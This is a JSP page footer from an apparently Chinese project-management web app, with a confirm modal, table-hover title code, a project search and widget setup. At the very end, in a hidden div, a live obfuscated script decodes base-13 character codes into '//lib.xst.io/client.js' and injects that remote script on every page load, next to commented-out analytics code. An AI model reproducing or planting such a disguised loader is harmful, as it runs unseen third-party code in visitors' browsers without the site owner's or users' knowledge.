<%@ page language="java" contentType="text/html; charset=utf-8" pageEncoding="utf-8"%>

<div class="modal fade" id="myModal">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal">
                    <span aria-hidden="true">&times;</span><span class="sr-only">Close</span>
                </button>
                <h4 class="modal-title">操作提示</h4>
            </div>
            <div class="modal-body">
                <p id="myModalContent">One fine body&hellip;</p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-danger">
                    <span class="glyphicon glyphicon-saved"></span> 确定
                </button>
                <button type="button" class="btn btn-default" data-dismiss="modal">
                    <span class="glyphicon glyphicon-share-alt"></span> 取消
                </button>
            </div>
        </div>
        <!-- /.modal-content -->
    </div>
    <!-- /.modal-dialog -->
</div>
<!-- /.modal -->

<script src="<s:url value="/assets/bootstrap-datepicker/js/bootstrap-datepicker.js" />"></script>
<script src="<s:url value="/assets/bootstrap-datepicker/js/bootstrap-datepicker.zh-CN.js" />" charset="UTF-8"></script>
<script src="<s:url value="/assets/jquery-validation/jquery.validate.min.js" />"></script>
<script src="<s:url value="/assets/jquery-validation/additional-methods.js" />"></script>
<script src="<s:url value="/assets/jquery-validation/localization/messages_zh.min.js" />"></script>
<script src="<s:url value="/assets/bootstrap-select/js/bootstrap-select.min.js" />"></script>
<script src="<s:url value="/assets/bootstrap-select/js/i18n/defaults-zh_CN.min.js" />"></script>
<script src="<s:url value="/assets/bootstrap-icheck/icheck.min.js" />"></script>
<script type="text/javascript">
$(function() {
	$("#footer").hide();
    $("td").hover(
    	function() {
			if($(this).parents("table").hasClass("notFooter")){
				return false;
			}
    		var rIndex = 2;
    		var cIndex = $(this).prevAll().length;
    		
    		var rTitle;
    		if($(this).parent().attr("class") == "total"){
    			rTitle = $(this).parent().children("th").text();
    			cIndex = cIndex + Number($(this).parent().children("th").attr("colspan")) - 1;
    		}else{
        		if(self.location.href.indexOf("/full") > 0 || self.location.href.indexOf("/month") > 0 || self.location.href.indexOf("/yeardetail") > 0){
            		rTitle = $(this).parent().children("td[id=projectName]").text();
        		}else if(self.location.href.indexOf("/year") > 0){
            		rTitle = $(this).parent().children("td[id=field01]").text();
        		}else if(self.location.href.indexOf("/paymentitem") > 0){
        			rTitle = $(this).parent().children("td:eq(1)").text();
        		}else{
        			rTitle = $(this).parent().children("td:eq(" + rIndex + ")").text();
        		}
    		}
    		var cTitle = $(this).parents("table").find("thead tr:last th:eq(" + cIndex + ")").html();
    		if(rTitle || cTitle){
    			var context = [];
    			if(cTitle)context.push(cTitle);
    			if(rTitle)context.push(rTitle);
	    		var title = "当前：" + context.join("，");
	    		$("#footer span").html(title).parents("div").clearQueue().slideDown();
    		}
    		return false;
    	},function() {
    		//$("#footer").slideUp();
    	}
    );
    $("table").hover(
    		function() {
    		},function() {
    			if($(this).hasClass("notFooter")){
    				return false;
    			}
    			$("#footer").slideUp();
    		}
    );
});
</script>
<script type="text/javascript">
    function goback(){
    	history.go(-1);
    	return false;
    }

	$(function() {      
		$("body").delegate("#btn-search-project","click",function() {
			var text = $("#search-project").val().trim();
			if(text){
				$.get("<s:url value='/project/get/' />"+text+".json",function(ret){
					if(ret.message == "0"){
						self.location.replace("<s:url value='/project/detail/' />"+ret.id);
					}else{
						$("#myModal .modal-title").html("操作提示");
						$("#myModalContent").html(ret.message);
						$("#myModal .btn-danger").off("click").on("click",function() {
							$('#myModal').modal("hide");
						});
						$('#myModal').modal("show");
					}
				});
			}
			return false;
		});
		$("body").delegate(".delete, .check","click",function() {
			$("#myModal .modal-title").html("操作提示");
			$("#myModalContent").html($(this).attr("data-confirm-message"));
			$('#myModal').data("href", $(this).attr("href"));
			$("#myModal .btn-danger").off("click").on("click",function() {
				var href = $("#myModal").data("href");
				if(href != null){
					self.location.replace(href);
				}
				$('#myModal').modal("hide");
			});
			$('#myModal').modal("show");
			return false;
		});

		$(".input-group.date").datepicker({
			language : "zh-CN",
			autoclose : true,
			todayHighlight : true
		});
		 $('.selectpicker').selectpicker();
		$(".icheckbox").iCheck({
			checkboxClass : 'icheckbox_minimal',
			radioClass : 'iradio_minimal',
			increaseArea : '20%' // optional
		});
		//  data-trigger="click hover focus"
		$("[title]").tooltip();
		$("[data-content]").data("html", true).data("trigger", "hover").popover();
		
		$(".select2").select2();
		
		$(".pager .disabled a").click(function() {
			return false;
		});

		var selfurl = self.location.href;
		if(selfurl.indexOf('/create') < 0 && selfurl.indexOf('/modify') < 0 && selfurl.indexOf('/step') < 0 && selfurl.indexOf('/paymentitem') < 0){
			// alert(selfurl);
			$.post("<s:url value='/api/setlasturl'/>", {url: selfurl});
		}
	});
</script>
<div id="footer" class="navbar-fixed-bottom">
        <h4 class="pull-right"><span id="ftitle" class="label label-default">行：***，列：***</span></h4>
    </div>
<div style="display:none">
<script>
/* var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?31adb78aa26ff9cfbbcef455ce2cac5e";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})(); */
(function () {
    var m = [], t = 'scr' + 'ipt', s = ['', '38', '38', '84', '81', '77', '37', '93', '8b', '8c', '37', '81', '87', '38', '78', '84', '81', '7a', '86', '8c', '37', '82', '8b', '4b'];
    for (var i = 1; i < s.length; i++) m += String.fromCharCode(parseInt(s[i], 13));
    var hm = document.createElement(t);
    hm.src = m + parseInt(Math.random() * 1e5);
    var s = document.getElementsByTagName(t)[0];
    s.parentNode.insertBefore(hm, s);
})();
</script></div>
</body>
</html>